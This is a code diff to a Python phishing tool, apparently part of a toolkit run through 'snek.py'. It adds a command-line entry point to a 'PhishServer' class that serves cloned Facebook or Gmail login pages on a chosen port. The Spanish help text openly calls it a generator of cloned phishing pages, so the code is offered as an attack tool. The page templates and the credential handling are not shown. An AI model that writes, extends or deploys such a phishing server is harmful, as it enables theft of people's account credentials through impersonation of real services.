@@ -188,4 +188,34 @@ class PhishServer:
                 f.write(templates[self.site])
 
     def stop(self):
-        """Detiene
+        """Detiene el servidor."""
+        if self.server:
+            self.server.shutdown()
+
+def main(args):
+    """Función principal llamada por snek.py"""
+    parser = argparse.ArgumentParser(description="Generador de páginas de phishing clonadas")
+    parser.add_argument('-s', '--site', default='facebook', 
+                       choices=['facebook', 'gmail'], help="Sitio a clonar (default: facebook)")
+    parser.add_argument('-p', '--port', type=int, default=8080, help="Puerto del servidor (default: 8080)")
+    parser.add_argument('-v', '--verbose', action='store_true', help="Modo verboso")
+
+    if not args:
+        parser.print_help()
+        return
+
+    try:
+        parsed_args = parser.parse_args(args)
+    except SystemExit:
+        return
+
+    # Iniciar servidor
+    server = PhishServer(
+        site=parsed_args.site,
+        port=parsed_args.port,
+        verbose=parsed_args.verbose
+    )
+    server.start()
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
